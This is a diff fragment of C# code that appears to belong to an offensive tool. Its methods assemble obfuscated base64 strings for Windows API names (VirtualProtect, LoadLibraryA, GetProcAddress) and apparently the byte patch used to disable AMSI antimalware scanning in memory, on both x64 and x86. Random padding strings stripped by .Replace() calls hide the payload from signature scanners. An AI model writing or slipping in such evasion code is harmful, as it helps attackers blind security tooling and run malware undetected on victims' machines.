-                "rpzSxVH8SXpCnlKRuMGOJCDLplDk81fSINa6kYVTYO9JgcUhhJkvWghplnmLRgAa2W4aKNqW1xz5C3pNRfDzRu5lquU6vJC1OjRKi4WTcO4jqmns8Z4wdKJIaSua3tkrv8qclfoXIuWCzW4DGm8VPPYDZJtQK6ZsnMys5KGdvgotyGSEXqURvPcfjnCB4DCrpzSxVH8SXpCnlKRuMGOJCDLplDk81fSINa6kYVTYO9JgcUhhJkvWghplnmLRgAa2W4aKNqW1xz5C3pNRfDzRu5lquU6vJC1OjRKi4WTcO4jqmns8Z4wdKJIaSua3tkrv8qclfoXIuWCzW4DGm8VPPYDZJtQK6ZsnMys5KGdvgotyGSEXqURvPcfjnC"
+                "foP1sRHP6GwZ56ha1DNmrX5pz38ibJKXqVHACxoLoLuCEeWa1B7rdzoItjCyTjyx6ZtjzgXDZC7fn3kUghqZLc31r8Rcu02FX7FpvwlUn3Sb1Jfz8sSv2Yldf120P5TjJ2Hqx5it6WvR5CdWZmZXI=foP1sRHP6GwZ56ha1DNmrX5pz38ibJKXqVHACxoLoLuCEeWa1B7rdzoItjCyTjyx6ZtjzgXDZC7fn3kUghqZLc31r8Rcu02FX7FpvwlUn3Sb1Jfz8sSv2Yldf120P5TjJ2Hqx5it6WvR"
                     .Replace(
-                        "rpzSxVH8SXpCnlKRuMGOJCDLplDk81fSINa6kYVTYO9JgcUhhJkvWghplnmLRgAa2W4aKNqW1xz5C3pNRfDzRu5lquU6vJC1OjRKi4WTcO4jqmns8Z4wdKJIaSua3tkrv8qclfoXIuWCzW4DGm8VPPYDZJtQK6ZsnMys5KGdvgotyGSEXqURvPcfjnC",
-                        "");
-            input +=
-                "rpzSxVH8SXpCnlKRuMGOJCDLplDk81fSINa6kYVTYO9JgcUhhJkvWghplnmLRgAa2W4aKNqW1xz5C3pNRfDzRu5lquU6vJC1OjRKi4WTcO4jqmns8Z4wdKJIaSua3tkrv8qclfoXIuWCzW4DGm8VPPYDZJtQK6ZsnMys5KGdvgotyGSEXqURvPcfjnCGAA=rpzSxVH8SXpCnlKRuMGOJCDLplDk81fSINa6kYVTYO9JgcUhhJkvWghplnmLRgAa2W4aKNqW1xz5C3pNRfDzRu5lquU6vJC1OjRKi4WTcO4jqmns8Z4wdKJIaSua3tkrv8qclfoXIuWCzW4DGm8VPPYDZJtQK6ZsnMys5KGdvgotyGSEXqURvPcfjnC"
-                    .Replace(
-                        "rpzSxVH8SXpCnlKRuMGOJCDLplDk81fSINa6kYVTYO9JgcUhhJkvWghplnmLRgAa2W4aKNqW1xz5C3pNRfDzRu5lquU6vJC1OjRKi4WTcO4jqmns8Z4wdKJIaSua3tkrv8qclfoXIuWCzW4DGm8VPPYDZJtQK6ZsnMys5KGdvgotyGSEXqURvPcfjnC",
+                        "foP1sRHP6GwZ56ha1DNmrX5pz38ibJKXqVHACxoLoLuCEeWa1B7rdzoItjCyTjyx6ZtjzgXDZC7fn3kUghqZLc31r8Rcu02FX7FpvwlUn3Sb1Jfz8sSv2Yldf120P5TjJ2Hqx5it6WvR",
                         "");
 
             return input;
         }
 
-        public static string VirtualProtect()
+        public static string X64PatchDllAmsi()
         {
             string input = "";
             input +=
-                "ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cfVmlyed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cf"
+                "erFdIbjDNnns2bcNotuRcipxpe4SNMjMl53RKfMnGJXgXHodPgQK9df6BRxohQzADbH6iLDJgHKSKJZizaDq6ZMHa6Q2riGzUWc6As5EdGn2SNw21PyGNIEoO9gl4Kb8AU7yqchuFcAB4DDerFdIbjDNnns2bcNotuRcipxpe4SNMjMl53RKfMnGJXgXHodPgQK9df6BRxohQzADbH6iLDJgHKSKJZizaDq6ZMHa6Q2riGzUWc6As5EdGn2SNw21PyGNIEoO9gl4Kb8AU7yqch"
                     .Replace(
-                        "ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cf",
-                        "");
-            input +=
-                "ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cfdHVhed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cf"
-                    .Replace(
-                        "ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cf",
-                        "");
-            input +=
-                "ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cfbFByed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cf"
-                    .Replace(
-                        "ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cf",
-                        "");
-            input +=
-                "ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cfb3Rled34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cf"
-                    .Replace(
-                        "ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cf",
-                        "");
-            input +=
-                "ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cfY3Q=ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cf"
-                    .Replace(
-                        "ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cf",
+                        "erFdIbjDNnns2bcNotuRcipxpe4SNMjMl53RKfMnGJXgXHodPgQK9df6BRxohQzADbH6iLDJgHKSKJZizaDq6ZMHa6Q2riGzUWc6As5EdGn2SNw21PyGNIEoO9gl4Kb8AU7yqch",
                         "");
 
             return input;
         }
 
-        public static string LoadLibraryA()
+        public static string X86PatchDllAmsi()
         {
             string input = "";
             input +=
-                "e9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCfTG9he9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCf"
+                "lAMshRDsh3QB4fF19cl8IdOD86RvUINuf1LiRiXUNDWQk3RH9fU2h48IwJtlARYYqgfDThjaFRuEG7dEoJwzxUMk3DwHzwT5p8kDYOyc53wQJ3Byqo60fjkVT4JPvclT7yYIXZqaVT33i6a9C7bKzdZGXOtdEirdSduFcAB4DCGAlAMshRDsh3QB4fF19cl8IdOD86RvUINuf1LiRiXUNDWQk3RH9fU2h48IwJtlARYYqgfDThjaFRuEG7dEoJwzxUMk3DwHzwT5p8kDYOyc53wQJ3Byqo60fjkVT4JPvclT7yYIXZqaVT33i6a9C7bKzdZGXOtdEirdSd"
                     .Replace(
-                        "e9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCf",
+                        "lAMshRDsh3QB4fF19cl8IdOD86RvUINuf1LiRiXUNDWQk3RH9fU2h48IwJtlARYYqgfDThjaFRuEG7dEoJwzxUMk3DwHzwT5p8kDYOyc53wQJ3Byqo60fjkVT4JPvclT7yYIXZqaVT33i6a9C7bKzdZGXOtdEirdSd",
                         "");
             input +=
-                "e9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCfZExpe9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCf"
+                "lAMshRDsh3QB4fF19cl8IdOD86RvUINuf1LiRiXUNDWQk3RH9fU2h48IwJtlARYYqgfDThjaFRuEG7dEoJwzxUMk3DwHzwT5p8kDYOyc53wQJ3Byqo60fjkVT4JPvclT7yYIXZqaVT33i6a9C7bKzdZGXOtdEirdSdA=lAMshRDsh3QB4fF19cl8IdOD86RvUINuf1LiRiXUNDWQk3RH9fU2h48IwJtlARYYqgfDThjaFRuEG7dEoJwzxUMk3DwHzwT5p8kDYOyc53wQJ3Byqo60fjkVT4JPvclT7yYIXZqaVT33i6a9C7bKzdZGXOtdEirdSd"
                     .Replace(
-                        "e9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCf",
+                        "lAMshRDsh3QB4fF19cl8IdOD86RvUINuf1LiRiXUNDWQk3RH9fU2h48IwJtlARYYqgfDThjaFRuEG7dEoJwzxUMk3DwHzwT5p8kDYOyc53wQJ3Byqo60fjkVT4JPvclT7yYIXZqaVT33i6a9C7bKzdZGXOtdEirdSd",
                         "");
-            input +=
-                "e9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCfYnJhe9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCf"
-                    .Replace(
-                        "e9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCf",
-                        "");
-            input +=
-                "e9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCfcnlBe9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCf"
-                    .Replace(
-                        "e9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCf",
-                        "");
+
             return input;
         }
 
-        public static string GetProcessAdress()
+        public static string VProtect()
         {
             string input = "";
             input +=
-                "SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1R2V0SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1"
-                    .Replace("SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1",
+                "VUlpggLBg77gfIoXlik4kfHlKsTTB6Dt1OEmAomxNRK1tD9BY6xMtCM0N9fyN29j3OoQECW66xqSUQ1GsR4EJ0AzCOZBJykVSkVmlydHVhbFVUlpggLBg77gfIoXlik4kfHlKsTTB6Dt1OEmAomxNRK1tD9BY6xMtCM0N9fyN29j3OoQECW66xqSUQ1GsR4EJ0AzCOZBJykVSk"
+                    .Replace(
+                        "VUlpggLBg77gfIoXlik4kfHlKsTTB6Dt1OEmAomxNRK1tD9BY6xMtCM0N9fyN29j3OoQECW66xqSUQ1GsR4EJ0AzCOZBJykVSk",
                         "");
             input +=
-                "SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1UHJvSArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1"
-                    .Replace("SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1",
+                "VUlpggLBg77gfIoXlik4kfHlKsTTB6Dt1OEmAomxNRK1tD9BY6xMtCM0N9fyN29j3OoQECW66xqSUQ1GsR4EJ0AzCOZBJykVSkByb3RlY3Q=VUlpggLBg77gfIoXlik4kfHlKsTTB6Dt1OEmAomxNRK1tD9BY6xMtCM0N9fyN29j3OoQECW66xqSUQ1GsR4EJ0AzCOZBJykVSk"
+                    .Replace(
+                        "VUlpggLBg77gfIoXlik4kfHlKsTTB6Dt1OEmAomxNRK1tD9BY6xMtCM0N9fyN29j3OoQECW66xqSUQ1GsR4EJ0AzCOZBJykVSk",
                         "");
-            input +=
-                "SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1Y0FkSArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1"
-                    .Replace("SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1",
-                        "");
-            input +=
-                "SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1ZHJlSArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1"
-                    .Replace("SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1",
-                        "");
-            input +=
-                "SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1c3M=SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1"
-                    .Replace("SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1",
-                        "");
+
             return input;
         }
     }
